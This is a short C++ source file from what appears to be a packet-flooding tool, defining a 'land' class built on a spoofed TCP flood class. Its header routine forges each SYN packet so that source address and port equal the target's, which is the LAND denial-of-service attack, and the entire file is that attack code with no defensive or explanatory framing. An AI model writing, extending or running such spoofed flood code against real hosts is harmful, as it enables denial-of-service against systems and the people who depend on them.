#include "land.h"

land::land() : spoofed_tcp_flood() {}

void land::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  ip->saddr = ip->daddr;
  tcp->th_flags = TH_SYN;
  tcp->th_sport = tcp->th_dport;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
